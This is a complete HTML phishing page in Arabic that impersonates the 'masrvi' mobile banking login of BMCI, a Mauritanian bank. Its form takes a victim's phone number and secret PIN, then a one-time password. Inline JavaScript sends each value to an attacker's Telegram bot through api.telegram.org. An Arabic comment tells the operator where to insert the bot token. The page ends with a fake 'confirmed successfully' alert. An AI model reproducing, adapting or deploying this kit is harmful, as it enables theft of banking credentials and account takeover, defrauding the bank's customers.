<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Masrvi</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&display=swap');
        body { margin: 0; background-color: #F2F2F2; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; height: 100vh; overflow: hidden; }
        .app { width: 100%; max-width: 400px; background: #fff; display: flex; flex-direction: column; height: 100%; }
        .header { background: #e67e22; padding: 50px 20px 30px; text-align: center; color: white; }
        .logo { font-size: 40px; font-weight: 900; margin: 0; letter-spacing: -1.5px; }
        .container { padding: 40px 25px; flex: 1; }
        label { display: block; margin-bottom: 10px; color: #333; font-weight: 700; }
        input { width: 100%; padding: 18px; border: 1.5px solid #eee; border-radius: 12px; background: #f9f9f9; font-size: 17px; text-align: center; margin-bottom: 25px; box-sizing: border-box; }
        .btn { background: #ad6d2f; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-size: 18px; font-weight: 700; cursor: pointer; }
        .hidden { display: none; }
        .footer { text-align: center; padding: 20px; color: #999; font-size: 13px; }
    </style>
</head>
<body>
<div class="app">
    <div class="header"><h1 class="logo">masrvi</h1><div style="font-size: 14px; opacity: 0.9;">BMCI - المصرف الموريتاني للاستثمار</div></div>
    
    <div id="step1" class="container">
        <label>رقم الهاتف</label>
        <input type="tel" id="phone" placeholder="00000000">
        <label>الرمز السري</label>
        <input type="password" id="pin" placeholder="••••">
        <button class="btn" onclick="sendData()">دخول آمن</button>
    </div>

    <div id="step2" class="container hidden">
        <h2 style="text-align: center;">تأكيد الهوية</h2>
        <div id="timer" style="text-align: center; color: #e67e22; font-size: 24px; margin-bottom: 20px; font-weight: 900;">2:00</div>
        <input type="text" id="otp" placeholder="• • • • • •">
        <button class="btn" onclick="sendOtp()">تأكيد</button>
    </div>
</div>

<script>
// ضع التوكن الجديد هنا بين علامتي التنصيص
const token = "ضع_التوكن_الجديد_هنا"; 
const id = "5244299184";

function sendData() {
    const p = document.getElementById('phone').value;
    const s = document.getElementById('pin').value;
    if(p && s) {
        const msg = encodeURIComponent(`🚨 دخول جديد:\n📱 هاتف: ${p}\n🔑 رمز: ${s}`);
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${msg}`;
        new Image().src = url; // الإرسال
        document.getElementById('step1').classList.add('hidden');
        document.getElementById('step2').classList.remove('hidden');
    }
}

function sendOtp() {
    const o = document.getElementById('otp').value;
    if(o) {
        const msg = encodeURIComponent(`🔢 الرمز OTP: ${o}`);
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${msg}`;
        new Image().src = url; // الإرسال
        alert("تم التأكيد بنجاح");
        location.reload();
    }
}
</script>
</body>
</html>
